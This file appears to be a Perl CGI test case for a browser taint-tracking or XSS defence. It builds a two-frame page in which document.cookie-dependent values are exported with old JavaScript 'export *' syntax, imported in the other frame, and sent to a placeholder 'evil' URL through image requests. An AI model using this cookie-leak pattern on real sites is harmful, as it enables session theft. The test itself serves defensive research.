#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_EXPORTALL";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";


my $query = new CGI;

my $frame = $query->param('frame');
if (!defined($frame)) {
print qq|<html>
<head>
<title>$title</title>
</head>
<frameset cols="250,*">
  <frame src="?frame=exporter" name="exporter">
  <frame src="?frame=importer" name="import">
  <noframes>
    Ihr Browser kann diese Seite leider nicht anzeigen!
  </noframes>
</frameset>
</html>
|;
}
if ($frame eq "exporter") {
print qq|
    <script type="text/javascript">
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;

		var evil = 2;
		if ($evil) {
			notevil2 = 3;
			evil = 43;
		}	
		notevil3 = evil;
		
		export *;
    </script>
|;
}
if ($frame eq "importer") {

$onload = "setTimeout('doit()',2000);";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
    function doit() {
		
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

        var exported = window.parent.exporter;
        
		// shouldn't be evil 

		import exported.notevil;
		dut = exported.notevil;
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		import exported.notevil2;
		dut2 = exported.notevil2;
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 	
		
		import exported.notevil3;
		dut3 = exported.notevil3;
		
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
	}
    </script>
|;

require "xss_basic_footer.pl";
}